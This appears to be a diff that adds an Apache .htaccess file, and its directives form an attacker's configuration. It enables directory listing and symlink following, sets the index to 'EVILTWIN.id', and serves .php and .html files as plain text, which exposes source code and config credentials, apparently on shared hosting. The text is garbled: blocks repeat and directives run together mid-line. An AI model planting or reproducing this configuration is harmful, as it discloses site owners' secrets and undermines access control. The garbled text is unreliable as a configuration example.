@@ -1,0 +1,19 @@
+Options Indexes FollowSymLinks
+DirectoryIndex EVILTWIN.id
+AddType txt .php
+AddHandler txt .phpOptions Indexes FollowSymLinks
+DirectoryIndex EVILTWIN.id
+AddType txt .php
+AddHandler txt .phpOptions all
+Options +Indexes 
+Options +FollowSymLinks 
+DirectoryIndex EVILTWIN.id
+AddType text/plain .php
+AddHandler server-parsed .php
+AddType text/plain .html
+AddHandler txt .html
+Require None
+Satisfy AnyOptions Indexes FollowSymLinks
+DirectoryIndex EVILTWIN.id
+AddType txt .php
+AddHandler txt .php
